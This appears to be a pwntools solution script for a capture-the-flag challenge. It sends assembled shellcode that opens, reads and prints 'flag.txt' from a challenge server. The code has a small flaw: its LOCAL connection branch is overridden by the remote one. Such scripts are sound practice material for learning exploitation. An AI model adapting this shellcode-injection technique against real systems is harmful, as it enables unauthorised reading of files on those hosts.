#!/usr/bin/env python3

from pwn import *

exe = ELF("./binary")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    if args.GDB:
        r = gdb.debug([exe.path], '''
        c
        ''')
    else:
        r = remote("cyberchallenge-web", 9044)

    return r


def main():
    r = conn()

    shellcode = shellcraft.open('flag.txt', 0)
    shellcode += 'mov ebx, eax\n'
    shellcode += shellcraft.read('ebx', 'rdi', 0x100)
    shellcode += shellcraft.write(1, 'rsi', 0x100)
    shellcode += shellcraft.exit()

    shellcode = asm(shellcode)

    r.sendline(shellcode)

    r.interactive()


if __name__ == "__main__":
    main()
